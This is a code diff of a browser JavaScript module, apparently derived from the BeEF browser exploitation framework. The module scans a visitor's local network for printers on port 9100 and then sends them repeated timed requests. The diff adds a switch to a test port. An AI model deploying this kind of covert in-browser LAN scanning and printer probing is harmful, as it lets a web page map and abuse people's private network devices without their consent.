@@ -2,6 +2,12 @@
 //https://github.com/beefproject/beef/blob/master/modules/network/identify_lan_subnets/command.js
 //https://github.com/diafygi/webrtc-ips
 
+testing = false;
+
+setTesting = function() {
+    testing = true;
+}
+
 execute = function() {
 
     function doScan(localIp, timeout, onDiscover) {
@@ -50,8 +56,17 @@ execute = function() {
 
     }
 
-    var printerPort = 9123;
-
+    var printerPort = 9100;
+    var testingPort = 9123;
+    
+    function getPort () {
+        if (testing) {
+            return testingPort;
+        } else {
+            return printerPort;
+        }
+    }
+    
     function detectPrinter(ip, timeout, onDiscover) {
         var d = new Date();
         var xhr = new XMLHttpRequest();
@@ -62,7 +77,7 @@ execute = function() {
                 onDiscover(ip);
             }
         };
-        xhr.open('GET', 'https://' + ip + ':' + printerPort, true);
+        xhr.open('GET', 'https://' + ip + ':' + getPort(), true);
         xhr.send();
     }
 
@@ -72,7 +87,7 @@ execute = function() {
         setInterval(function() {
             var xhr = new XMLHttpRequest();
             xhr.timeout = request_timeout;
-            xhr.open('GET', 'https://' + ip + ':' + printerPort, true);
+            xhr.open('GET', 'https://' + ip + ':' + getPort(), true);
             xhr.send();
         }, interval);
     }
